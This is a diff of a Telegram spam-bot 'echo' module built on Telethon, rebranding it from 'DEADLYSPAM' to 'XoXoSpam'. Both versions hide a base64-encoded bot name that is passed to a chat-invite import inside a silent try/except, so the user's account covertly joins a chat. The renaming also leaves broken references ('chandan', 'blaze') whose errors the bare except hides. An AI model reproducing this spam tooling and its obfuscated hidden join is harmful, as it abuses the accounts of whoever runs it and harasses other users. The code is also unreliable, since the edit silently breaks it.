@@ -6,10 +6,10 @@ import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from DEADLYSPAM import BOT0, BOT1, BOT2, BOT3, BOT4, BOT5, BOT6, BOT7, BOT8, BOT9, SUDO_USERS, OWNER_ID
-from DEADLYSPAM import CMD_HNDLR as hl
-from resources.data import GROUP, DEADLYSPAM
-from DEADLYSPAM.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+from XoXoSpam import BOT0, BOT1, BOT2, BOT3, BOT4, BOT5, BOT6, BOT7, BOT8, BOT9, SUDO_USERS, OWNER_ID
+from XoXoSpam import CMD_HNDLR as hl
+from resources.data import GROUP, XoXoSpam
+from XoXoSpam.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
 @BOT0.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@@ -28,8 +28,8 @@ async def echo(event):
      if event.reply_to_msg_id is not None:
             reply_msg = await event.get_reply_message()
             user_id = reply_msg.sender_id
-            if int(user_id) in DEADLYSPAM:
-                    text = f"I Can't Echo @deadly_spam_bot Owner"
+            if int(user_id) in XoXoSpam:
+                    text = f"I Can't Echo @XoXoSpamtBot Owner"
                     await event.reply(text, parse_mode=None, link_preview=None )
             elif int(user_id) == OWNER_ID:
                     text = f"This Guy is Owner Of These Bots."
@@ -40,9 +40,9 @@ async def echo(event):
             else:
                  chat_id = event.chat_id
                  try:
-                     chandan = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
-                     chandan = Get(chandan)
-                     await event.client(chandan)
+                     Legend = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
+                     Legend = Get(chandan)
+                     await event.client(Legend)
                  except BaseException:
                     pass
                  if is_echo(user_id, chat_id):
@@ -71,8 +71,8 @@ async def echo(event):
             user_id = reply_msg.sender_id
             chat_id = event.chat_id
             try:
-                blaze = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
-                blaze = Get(blaze)
+                XoXo = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
+                XoXo = Get(XoXo)
                 await event.client(blaze)
             except BaseException:
                 pass
